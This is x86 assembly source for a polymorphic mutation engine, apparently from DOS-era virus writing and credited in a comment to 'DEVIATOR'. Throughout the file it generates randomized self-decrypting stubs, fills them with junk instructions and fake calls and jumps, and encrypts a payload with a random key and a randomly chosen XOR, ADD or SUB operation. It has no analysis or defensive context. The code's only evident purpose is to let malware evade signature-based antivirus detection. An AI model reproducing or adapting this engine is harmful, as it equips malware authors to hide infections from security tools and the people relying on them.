   CallNum equ 20
   InCall  equ 4
   GGMax   equ 5
   GGMin   equ 3

   NoGarb  equ 0

   Smm32   proc
       pushad
       push di

       push cx di
       mov di,offset Pointer
       mov cx,DataL
       xor ax,ax
   rep stosb
       pop  di cx

       mov ODi,di
       mov OSi,si
       mov OCx,cx

   BadP:   Call Get8
       cmp al,4
       jz BadP
       cmp al,5
       jz BadP
       mov Pointer,al
   BadC:   Call  Get8
       cmp al,4
       jz BadC
       cmp Pointer,al
       jz BadC
       mov Counter,al
   BadK:   Call Get8
       cmp al,4
       jz BadK
       cmp Counter,al
       jz BadK
       cmp Pointer,al
       jz BadK
       mov KeyWord,al

       mov si,offset Decr

       Call Garble
       movsw
       push di
       stosd
       mov Cz,di
       Call Garble
       pop  bx
       mov ax,di
       sub ax,bx           ; Call GetOffs
       sub ax,4
       movzx eax,ax
       mov [Bx],eax
       Call Garble
       movsb
       lodsb
       add al,Pointer
       stosb
       Call Garble
       movsw
       lodsb
       add al,Pointer          ; Add Pointer,Offset Data
       stosb
       mov DPatch,di
       xor eax,eax
       stosd
       Call Garble
       movsb
       lodsb
       add al,Counter          ; Mov 32bit Counter,Number
       stosb
       mov ax,OCx
       shr ax,2
       inc ax
       stosw
       xor ax,ax
       stosw
       Call Garble
       movsb
       lodsb
       add al,KeyWord          ; Mov 32bit keyword,number
       stosb
       Call GetMax
       mov bp,ax
       shl ebp,16
       Call GetMax
       mov bp,ax
       xchg eax,ebp
       mov DKey,eax
       stosd
   ; Encryption Loop
       mov EncLoop,di
       Call Garble
       movsw               ; Xor Cs:[Pointer],KeyWord
       movsb
       mov ax,3
       Call GetRnd
       movzx eax,ax
       lea ebx,[Eax*2][DTypes]
       mov al,ds:[Ebx]
       stosb
       mov al,ds:[Ebx][1]
       mov Crypter,al
       mov al,KeyWord
       shl al,3
       add al,Pointer
       stosb
       Call Garble
       movsw               ; Add Pointer,4
       lodsb
       add al,Pointer
       stosb
       movsb
       Call Garble
       movsb
       lodsb               ; Dec Counter
       add al,Counter
       stosb
       Call FGarb
       movsw               ; Jne Loop
       mov ax,EncLoop
       sub ax,di
       dec ax
       dec ax
       stosw
       Call Garble
       mov ax,di
       sub ax,Cz
       mov bx,DPatch
       mov [bx],ax
       mov si,OSi
       mov cx,OCx
       shr cx,2
       inc cx
       mov ebx,DKey
   CryptIt:lodsd
       db  066h
   Crypter db  ?
       db  0C3h
       stosd
       loop CryptIt

       mov cx,5
   FillG:  push cx
       Call GetMax
       stosb
       pop  cx
       loop FillG

   R16:    Call MCall16
       cmp [FCallp16],0
       jnz R16

   R32:    Call MCall32
       cmp [FCallp32],0
       jnz R32

       pop ax
       mov bx,di
       sub bx,ax
       mov NewL,bx
       popad
       mov cx,NewL
       ret
   Smm32   endp

   Garble  proc
   If  NoGarb
       retn
   EndIf
       push eax ebx ecx edx ebp esi
       mov ax,GGMax
       cmp Jxx16,0
       jz  NoShr
       mov ax,GGMin
   NoShr:  inc ax
       Call GetRnd
       xchg ax,cx
       inc cx
   MakeG:  push cx
       Call Trash
       pop  cx
       loop MakeG
       pop esi ebp edx ecx ebx eax
       ret
   Garble  endp

   TrashT  dw  offset IncDec32     ;0
       dw  offset IncDec16     ;1
       dw  offset Mov32        ;2
       dw  offset Mov16        ;3
       dw  offset Jx32     ;4
       dw  offset Jx16     ;5
       dw  offset Call16       ;6
       dw  offset Call32       ;7
       dw  offset PutCall16    ;8
       dw  offset PutCall32    ;9
       dw  offset OneByters    ;10
       dw  offset TwoThreeFour16   ;11
       dw  offset TwoThreeFour8    ;12
       dw  offset Mov8     ;13
       dw  offset Mbsf32       ;14
       dw  offset Mbsf16       ;15
       dw  offset MbtReg       ;16
       dw  offset MbtImm       ;17
       dw  offset Mbt32        ;18
       dw  offset Mbt32i       ;19
       dw  offset MMovzx       ;20
       dw  offset MFCall16     ;21
       dw  offset MFCall32     ;22
       dw  offset MCall16      ;23
       dw  offset MCall32      ;24
   TrashTL equ ($ - TrashT) shr 1

   FGarb   proc
   If  NoGarb
       retn
   EndIF
       push esi
       mov ax,4
       Call GetRnd
       inc ax
       xchg ax,cx
   zFFF:   push cx
       Call FTrash
       pop  cx
       loop zFFF
       pop  esi
       ret
   FGarb   endp

   FT  dw  offset Mov32
       dw  offset Mov16
       dw  offset MMovzx
       dw  offset Call16
       dw  offset Call32
   FtL equ ($ - Ft) shr 1

   FTrash  proc
       mov ax,FtL
       Call GetRnd
       movzx eax,ax
       lea ecx,[eax*2][Ft]
       Call word ptr [Ecx]
       ret
   FTrash  endp

   Trash   proc
       mov ax,TrashTL
       Call GetRnd
   ; Think for a while for smooth decryptors
       cmp OldTrash,10
       jnz NotOneByters
       mov ax,2
       Call GetRnd
       add ax,11
       jmp DoIt
   NotOneByters:
       cmp ax,8
       jb NoIdeas
       cmp ax,9
       jbe DoIt
   NoIdeas:
   ; No more ideas ;)
       cmp ax,OldTrash
       jz Trash
   DoIt:   mov OldTrash,ax
       movzx eax,ax
       lea ecx,[eax*2][TrashT]
       Call word ptr [ECX]
       ret
   Trash   endp

   Mov32:
       mov al,66h
       stosb
       Call Mov16
       Call GetMax
       stosw
       ret
   Mov16:
       Call GetReg
       add al,0B8h
       stosb
       Call GetMax
       stosw
       ret

   IncDec32:
       mov al,66h
       stosb
       Call IncDec16
       ret

   IncDec16:
       Call GetReg
       push ax
       mov ax,2
       Call GetRnd
       dec ax
       pop  ax
       jnz NoDDD
       add al,8
   NoDDD:  add al,40h
       stosb
       ret

   Jx32:   cmp Jxx32,2
       jae NoJx32
       cmp Jxx16,0
       jnz NoJx32
       inc Jxx32
       mov al,0Fh
       stosb
       mov ax,16
       Call GetRnd
       add al,80h
       stosb
       push di
       stosw
       Call Garble
       pop  bx
       mov ax,di
       sub ax,bx
       dec ax
       dec ax
       mov [bx],ax
       dec Jxx32
       ret
   NoJx32: mov Jxx32,0
       ret

   Jx16:   cmp Jxx16,2
       jae NoJx16
       Inc Jxx16
       mov ax,16
       Call GetRnd
       add al,70h
       stosb
       push di
       stosb
       Call Garble
       pop bx
       mov ax,di
       sub ax,bx
       dec ax
       mov [Bx],al
       Dec Jxx16
   NoJx16: ret

   Call16: cmp Jxx16,0
       jnz NoMoreCall16
       cmp Callp16,CallNum-1
       jae NoMoreCall16
       cmp CallsIn,InCall
       jae NoMoreCall16
       inc CallsIn
       mov al,0E9h         ; Jmp
       stosb
       stosw
       push di
       Call Trash
       push di
       Call Garble
       mov al,0C3h         ; Ret
       stosb
       Call Trash
       pop  ax
       movzx ecx,Callp16
       mov [ecx*2][Callt16],ax
       pop  bx
       mov ax,di
       sub ax,bx
       mov [bx][-2],ax
       Dec CallsIn
       Inc Callp16
   NoMoreCall16:
       ret

   Call32: cmp Jxx16,0
       jnz NoMoreCall32
       cmp Callp32,CallNum-1
       jae NoMoreCall32
       cmp CallsIn,InCall
       jae NoMoreCall32
       inc CallsIn
       mov ax,0E966h           ; Jmp
       stosw
       stosd
       push di
       Call Trash
       push di
       Call Garble
       mov ax,0C366h           ; Ret
       stosw
       Call Trash
       pop  ax
       movzx ecx,Callp32
       mov [ecx*2][Callt32],ax
       pop  bx
       movzx eax,di
       movzx ebx,bx
       sub eax,ebx
       mov [bx][-4],eax
       Dec CallsIn
       Inc Callp32
   NoMoreCall32:
       ret

   PutCall16:
       mov ax,Callp16
       or ax,ax
       jz NoCall16
       Call GetRnd
       movzx ecx,ax
       mov al,0E8h
       stosb
       mov ax,[ecx*2][Callt16]
       sub ax,di
       dec ax
       dec ax
       stosw
   NoCall16:
       ret

   PutCall32:
       mov ax,Callp32
       or ax,ax
       jz NoCall32
       Call GetRnd
       movzx ecx,ax
       mov ax,0E866h
       stosw
       mov ax,[ecx*2][Callt32]
       movzx eax,ax
       movzx ecx,di
       sub eax,ecx
       sub eax,4
       stosd
   NoCall32:
       ret

   OneByters:
       mov ax,OneByteL
       call GetRnd
       xchg ax,si
           mov al,[si][OneByte]
       stosb
       ret
   OneByte db  02Eh,03Eh,0F8h,0F9h,0FBh,0FCh,026h,36h,64h,65h
   OneByteL    equ $ - OneByte

   TwoThreeFour16:

       call GetReg16
       push ax

           Call CheckBp

       mov ax,Bit16OpL
       call getrnd
       xchg ax,si
       mov al,[Bit16Op][Si]
       stosb
           pop ax
       stosb
       Call GetSize

       or cx,cx
       jz ReturnIt
   FillIt: call GetMax
       stosb
       loop FillIt
   ReturnIt:
       ret
   Bit16Op         db  03h,13h,23h,33h,0Bh,1Bh,2Bh,3Bh
   Bit16Opl    equ $ - Bit16Op


   TwoThreeFour8:
       call GetReg8
       push ax

       Call CheckBp

       mov ax,Bit8OpL
       call getrnd
       xchg ax,si
       mov al,[Bit8Op][Si]
       stosb

       pop ax
       stosb
       Call GetSize

       or cx,cx
       jz ReturnIt8
   FillUp8:
       call GetMax
       stosb
       loop FillUp8
   ReturnIt8:
       ret

   Bit8Op  db  02h,12h,22h,32h,0Ah,1Ah,2Ah,3Ah
   Bit8Opl equ $ - Bit8Op

   Mov8:   Call GReg8
       add al,0B0h
       stosb
       call GetMax
       stosb
       ret

   MBsf32: mov al,66h
       stosb
   MBsf16: mov bx,0BC0Fh
       mov ax,2
       Call GetRnd
       jnz NoIncBh
       inc bh
   NoIncBh:xchg ax,bx
       stosw
       Call GetReg
       shl ax,3
       mov bx,ax
       Call GetReg
       add ax,bx
       add al,0C0h
       stosb
       ret

   Mbt32:  mov al,66h
       stosb
   MBtReg: mov al,0Fh
       stosb
       mov ax,4
       Call GetRnd
       shl ax,3
       add al,0A3h
       stosb
       Call GetReg
       shl ax,3
       mov bx,ax
       Call GetReg
       add ax,bx
       add al,0C0h
       stosb
       ret

   Mbt32i: mov al,66h
       stosb
   MbtImm: mov ax,0BA0Fh
       stosw
       mov ax,4
       Call GetRnd
       shl ax,3
       Call GetReg
       add al,0F0h
       stosb
       mov ax,16
       Call GetRnd
       stosb
       ret

   MMovZx: mov al,66h
       stosb
       mov ax,0B70Fh
       stosw
       Call GetReg
       shl ax,3
       mov bx,ax
       Call Get8
       add ax,bx
       add al,0C0h
       stosb
       ret

   MFCall16:
       cmp CallsIn,0
       jnz NoFCall16
       movzx ecx,FCallp16
       cmp ecx,CallNum-1
       jae NoFCall16
       mov al,0E8h
       stosb
       stosw
       mov [ecx*2][FCallt16],di
       inc FCallp16
   NoFCall16:
       ret

   MFCall32:
       cmp CallsIn,0
       jnz NoFCall32
       movzx ecx,FCallp32
       cmp ecx,CallNum-1
       jae NoFCall32
       mov ax,0E866h
       stosw
       stosd
       mov [ecx*2][FCallt32],di
       inc FCallp32
   NoFCall32:
       ret

   MCall16:
       cmp Jxx16,0
       jnz NCall16
       cmp FCallp16,0
       jz  NCall16
       dec FCallp16
       movzx ecx,FCallp16
       mov bx,[ecx*2][FCallt16]
       mov al,0E9h         ; Jmp
       stosb
       stosw
       push di bx
       Call Trash
       pop  bx
       mov ax,di
       sub ax,bx
       mov [Bx][-2],ax
       Call Garble
       mov al,0C3h         ; Ret
       stosb
       Call Trash
       pop bx
       mov ax,di
       sub ax,bx
       mov [bx][-2],ax
   NCall16:
       ret

   MCall32:
       cmp Jxx16,0
       jnz NCall32
       cmp FCallp32,0
       jz  NCall32
       dec FCallp32
       movzx ecx,FCallp32
       mov bx,[ecx*2][FCallt32]
       mov ax,0E966h           ; Jmp
       stosw
       stosd
       push di bx
       Call Trash
       pop     bx
       mov ax,di
       sub ax,bx
       movzx eax,ax
       mov [Bx][-4],eax
       Call Garble
       mov ax,0C366h           ; Ret
       stosw
       Call Trash
       pop bx
       movzx eax,di
       movzx ebx,bx
       sub   eax,ebx
       mov [bx][-4],eax
   NCall32:
       ret


   ;---------------------------------------
   GetReg  proc
       Call Get8
       cmp Pointer,al
       jz GetReg
       cmp Counter,al
       jz GetReg
       cmp KeyWord,al
       jz GetReg
       cmp al,4
       jz GetReg
       ret
   GetReg  endp

   GetReg16    proc
       Call GetMax
       push ax
       and al,00111000b
       shr al,3
       cmp al,Pointer
       jz BadReg
       cmp al,Counter
       jz BadReg
       cmp al,Keyword
       jz BadReg
       cmp al,4
       jz BadReg
       pop ax
       ret
   BadReg: pop ax
       jmp GetReg16
   GetReg16    endp

   GetSize proc
       xor cx,cx

       cmp al,40h
       ja NoCheckIt

       push ax
       and al,10000111b
       cmp al,6
       pop  ax
       jz Byte2

   NoCheckIt:
       cmp al,40h
       jb Byte0
       cmp al,80h
       jb Byte1
       cmp al,0C0h
       jae Byte0
   Byte2:  inc cx
   Byte1:  inc cx
   Byte0:  ret
   GetSize endp

   GetReg8 proc
       Call GetMax
       push ax
       and al,00111000b
       shr al,3
       cmp al,4
       jb NoSub3
       sub al,4
   NoSub3: cmp al,Counter
       jz BadReg8
       cmp al,Pointer
       jz BadReg8
       cmp al,KeyWord
       jz BadReg8
       pop ax
       ret
   BadReg8:
       pop ax
       jmp GetReg8
   GetReg8 endp

   GReg8   proc
           mov ax,7
           Call GetRnd
           mov bx,ax
           cmp al,4
           jb NotHi
           sub al,4
   NotHi:  cmp Counter,al
           jz Greg8
           cmp Pointer,al
           jz Greg8
           cmp Keyword,al
           jz Greg8
           mov al,bl
           ret
   GReg8   endp

   CReg    proc
       cmp [Counter],al        ; Reg used ?
       jz CregDone
       cmp [Pointer],al
       jz CregDone
           cmp [Keyword],al
           jz CregDone
       cmp al,4
   CRegDone:
           ret
   Creg    endp

   CheckBp proc
       mov cx,24
       mov ah,2
   CheckBp1:
       cmp al,ah
       jz MakePr
       add ah,8
       loop CheckBp1

       mov cx,24
       mov ah,3
   CheckBp2:
       cmp al,ah
       jz MakePr
       add ah,8
       loop CheckBp2

       mov cx,(0C0h-40h)/8
       mov ah,46h
   CheckBp3:
       cmp al,ah
       jz MakePr
       add ah,8
       loop CheckBp3

       jmp NoPrefix

   MakePr: mov ax,2
       Call Getrnd
       dec ax
       jz MakeEs
       mov al,3Eh
       stosb
       ret
   MakeEs: mov al,26h
       stosb
       ret
   NoPrefix:
       ret
   CheckBp endp

   ;---------------------------------------
   RSeed   dq  ?

   Randomize   proc
       pushad
       mov cx,2
   FillUp: push cx
       mov cx,4
   FillR:  in al,40h
       shl eax,8
       loop FillR
       xchg eax,ebx
       pop  cx
       loop FillUp
       mov dword ptr RSeed,eax
       mov dword ptr RSeed+4,ebx
       popad
       ret
   Randomize   endp

   GetRnd  proc
       push ecx ebx edx ax
       mov eax,dword ptr RSeed
       mov ebx,dword ptr RSeed+4
       xchg bh,bl
       xchg ah,al
       xchg bh,al
       adc eax,'IVED'      ; Copyleft ! 'DEVIATOR' backwards
       sbb ebx,'ROTA'
       rol eax,1
       ror ebx,1
       mov dword ptr RSeed,eax
       mov dword ptr RSeed+4,ebx
       pop cx
       jcxz NoDiv
       xor dx,dx
       div cx
       xchg ax,dx
   NoDiv:  pop edx ebx ecx
       ret
   GetRnd  endp

   GetMax  proc
       xor ax,ax
       Call GetRnd
       ret
   GetMax  endp

   Get8    proc
       mov ax,8
       Call GetRnd
       ret
   Get8    endp

   Decr    db  066h,0E8h           ; Call GetOfs
           db  066h,058h           ; Pop Pointer
           db  066h,081h,0C0h      ; Add pointer,offset Data
           db  066h,0B8h           ; Mov Counter,Length
           db  066h,0B8h           ; Mov KeyWord,Key
                       ; Decrypt:
           db  066h,02Eh,067h      ; Xor Cs:[Pointer],KeyWord
           db  066h,083h,0C0h,004h     ; Add Pointer,4
           db  066h,048h           ; Dec Counter
           db  00Fh,085h           ; Jne Decrypt

   DTypes  db  31h,33h         ; Xor/Xor
       db  01h,2Bh         ; Add/Sub
       db  29h,03h         ; Sub/Add
